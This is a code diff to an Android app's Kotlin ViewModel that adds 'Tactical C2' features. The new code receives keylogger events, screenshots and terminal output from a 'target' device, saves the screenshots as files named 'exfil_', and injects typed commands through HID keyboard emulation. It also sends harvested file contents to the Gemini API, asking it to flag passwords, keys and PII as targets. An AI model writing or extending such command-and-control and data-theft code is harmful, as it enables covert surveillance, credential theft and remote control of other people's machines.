@@ -103,10 +103,32 @@ class WebBridgeViewModel(application: Application) : AndroidViewModel(applicatio
     private val _nowPlayingArtworkBase64 = MutableStateFlow<String?>(null)
     val nowPlayingArtworkBase64 = _nowPlayingArtworkBase64.asStateFlow()
 
-    private val _wifiAudioStatus = MutableStateFlow("Idle")
-    val wifiAudioStatus = _wifiAudioStatus.asStateFlow()
     private val _wifiAudioStreamActive = MutableStateFlow(false)
     val wifiAudioStreamActive = _wifiAudioStreamActive.asStateFlow()
+
+    private val _wifiAudioStatus = MutableStateFlow("Idle")
+    val wifiAudioStatus = _wifiAudioStatus.asStateFlow()
+
+    // --- Tactical C2 States ---
+    private val _terminalLines = MutableStateFlow<List<String>>(listOf("C2 Bridge Initialized", "Awaiting target connection..."))
+    val terminalLines = _terminalLines.asStateFlow()
+
+    private val _screenshots = MutableStateFlow<List<File>>(emptyList())
+    val screenshots = _screenshots.asStateFlow()
+
+    private val _keystrokes = MutableStateFlow<List<String>>(emptyList())
+    val keystrokes = _keystrokes.asStateFlow()
+
+    private val _isPulseModeEnabled = MutableStateFlow(false)
+    val isPulseModeEnabled = _isPulseModeEnabled.asStateFlow()
+
+    private val _isProfiling = MutableStateFlow(false)
+    val isProfiling = _isProfiling.asStateFlow()
+
+    private val _fileSensitivities = MutableStateFlow<Map<String, String>>(emptyMap())
+    val fileSensitivities = _fileSensitivities.asStateFlow()
+
+    private val geminiRepo = com.example.rabit.data.gemini.GeminiRepositoryImpl()
 
     init {
         refreshLocalIp()
@@ -220,6 +242,25 @@ class WebBridgeViewModel(application: Application) : AndroidViewModel(applicatio
                                 val transferId = json.optString("transferId")
                                 if (transferId.isNotBlank()) {
                                     handleP2PUploadEnd(transferId)
+                                }
+                            }
+                            // --- Tactical C2 Handlers ---
+                            "TERMINAL_DATA" -> {
+                                val text = json.optString("text")
+                                if (text.isNotBlank()) {
+                                    _terminalLines.value = (_terminalLines.value + text).takeLast(200)
+                                }
+                            }
+                            "SCREENSHOT_BLOB" -> {
+                                val base64 = json.optString("dataBase64")
+                                if (base64.isNotBlank()) {
+                                    handleScreenshotBlob(base64)
+                                }
+                            }
+                            "KEYLOG_EVENT" -> {
+                                val key = json.optString("key")
+                                if (key.isNotBlank()) {
+                                    _keystrokes.value = (listOf(key) + _keystrokes.value).take(500)
                                 }
                             }
                         }
@@ -853,5 +894,101 @@ class WebBridgeViewModel(application: Application) : AndroidViewModel(applicatio
     override fun onCleared() {
         super.onCleared()
         webRtcManager.stop()
+    }
+
+    private fun handleScreenshotBlob(base64: String) {
+        viewModelScope.launch(Dispatchers.IO) {
+            try {
+                val data = android.util.Base64.decode(base64, android.util.Base64.DEFAULT)
+                val bitmap = android.graphics.BitmapFactory.decodeByteArray(data, 0, data.size)
+                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                val hackieDir = File(downloadsDir, "Hackie/Screenshots")
+                if (!hackieDir.exists()) hackieDir.mkdirs()
+                
+                val file = java.io.File(hackieDir, "exfil_${System.currentTimeMillis()}.png")
+                java.io.FileOutputStream(file).use { out ->
+                    bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, out)
+                }
+                refreshScreenshots()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+
+    private fun refreshScreenshots() {
+        viewModelScope.launch(Dispatchers.IO) {
+            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+            val hackieDir = File(downloadsDir, "Hackie/Screenshots")
+            if (hackieDir.exists() && hackieDir.isDirectory) {
+                val files = hackieDir.listFiles { f -> f.name.startsWith("exfil_") }
+                    ?.sortedByDescending { it.lastModified() }
+                    ?: emptyList()
+                _screenshots.value = files.toList()
+            }
+        }
+    }
+
+    fun clearKeystrokes() {
+        _keystrokes.value = emptyList()
+    }
+
+    fun togglePulseMode() {
+        _isPulseModeEnabled.value = !_isPulseModeEnabled.value
+        repository.isPulseModeEnabled = _isPulseModeEnabled.value
+    }
+
+    fun sendHidCommand(cmd: String) {
+        viewModelScope.launch {
+            repository.sendText(cmd)
+            repository.sendKey(com.example.rabit.domain.model.HidKeyCodes.KEY_ENTER)
+            _terminalLines.value = (_terminalLines.value + "> $cmd").takeLast(200)
+        }
+    }
+
+    fun analyzeFileSensitivity(file: java.io.File) {
+        if (!file.exists()) return
+        
+        viewModelScope.launch {
+            _isProfiling.value = true
+            try {
+                val apiKey = prefs.getString("gemini_api_key", "") ?: ""
+                if (apiKey.isBlank()) return@launch
+
+                val fileContent = withContext(Dispatchers.IO) {
+                    try {
+                        if (file.length() > 50_000) {
+                            val buf = ByteArray(20_000)
+                            file.inputStream().use { it.read(buf) }
+                            String(buf, Charsets.UTF_8) + "\n...[TRUNCATED]..."
+                        } else {
+                            file.readText()
+                        }
+                    } catch (e: Exception) {
+                        "[BINARY_OR_ENCRYPTED_BLOB]"
+                    }
+                }
+
+                val request = com.example.rabit.domain.model.gemini.GeminiRequest(
+                    prompt = "Analyze this file content for sensitivity (PII, Passwords, Keys, System Configs). Categorize as [CRITICAL], [TARGET], or [CLEAN]. Provide a 1-sentence tactical summary.\n\nFile: ${file.name}\nContent:\n$fileContent",
+                    systemPrompt = "You are a Tactical Sensitivity Profiler. Categorize files precisely based on risk.",
+                    temperature = 0.3f
+                )
+
+                val response = geminiRepo.sendPrompt(request, apiKey)
+                if (response.error == null) {
+                    val result = response.text
+                    _fileSensitivities.value = _fileSensitivities.value + (file.absolutePath to result)
+                }
+            } catch (e: Exception) {
+                Log.e("WebBridgeVM", "Sensitivity analysis failed", e)
+            } finally {
+                _isProfiling.value = false
+            }
+        }
+    }
+
+    fun clearFileSensitivities() {
+        _fileSensitivities.value = emptyMap()
     }
 }
